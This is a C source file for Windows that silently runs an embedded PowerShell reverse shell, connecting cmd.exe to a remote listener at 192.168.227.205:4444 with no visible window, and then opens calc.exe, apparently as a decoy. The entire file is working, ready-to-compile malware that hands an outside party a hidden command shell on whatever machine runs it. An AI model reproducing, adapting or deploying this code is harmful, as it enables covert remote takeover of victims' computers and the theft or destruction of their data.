#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

int main()
{

    char text[] = "powershell -c \"function cleanup {if ($client.Connected -eq $true) {$client.Close()};if ($process.ExitCode -ne $null) {$process.Close()};exit};$address = '192.168.227.205';$port = '4444';$client = New-Object system.net.sockets.tcpclient;$client.connect($address,$port);$stream = $client.GetStream();$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize;$process = New-Object System.Diagnostics.Process;$process.StartInfo.FileName = 'cmd.exe';$process.StartInfo.RedirectStandardInput = 1;$process.StartInfo.RedirectStandardOutput = 1;$process.StartInfo.UseShellExecute = 0;$process.Start();$inputstream = $process.StandardInput;$outputstream = $process.StandardOutput;Start-Sleep 1;$encoding = new-object System.Text.AsciiEncoding;while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())};$stream.Write($encoding.GetBytes($out),0,$out.Length);$out = $null; $done = $false; $testing = 0;while (-not $done) {if ($client.Connected -ne $true) {cleanup};$pos = 0; $i = 1;while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos);$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}};if ($pos -gt 0) {$string = $encoding.GetString($networkbuffer,0,$pos);$inputstream.write($string);start-sleep 1;if ($process.ExitCode -ne $null) {cleanup} else {$out = $encoding.GetString($outputstream.Read());while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}};$stream.Write($encoding.GetBytes($out),0,$out.length);$out = $null;$string = $null}} else {cleanup}};\"";
    STARTUPINFO si;

    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Create the process
    if (!CreateProcess(NULL,             // No module name (use command line)
                       (LPSTR)text,      // Command line
                       NULL,             // Process handle not inheritable
                       NULL,             // Thread handle not inheritable
                       FALSE,            // Set handle inheritance to FALSE
                       CREATE_NO_WINDOW, // No creation flags
                       NULL,             // Use parent's environment block
                       NULL,             // Use parent's starting directory
                       &si,              // Pointer to STARTUPINFO structure
                       &pi)              // Pointer to PROCESS_INFORMATION structure
    )
    {
        return EXIT_FAILURE;
    }

    // Calculator
    if (!CreateProcess(NULL,               // No module name (use command line)
                       (LPSTR) "calc.exe", // Command line
                       NULL,               // Process handle not inheritable
                       NULL,               // Thread handle not inheritable
                       FALSE,              // Set handle inheritance to FALSE
                       CREATE_NO_WINDOW,   // No creation flags
                       NULL,               // Use parent's environment block
                       NULL,               // Use parent's starting directory
                       &si,                // Pointer to STARTUPINFO structure
                       &pi)                // Pointer to PROCESS_INFORMATION structure
    )
    {
        return EXIT_FAILURE;
    }

    // Close process handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    // The calling process continues its execution or exits
    return EXIT_SUCCESS;
}
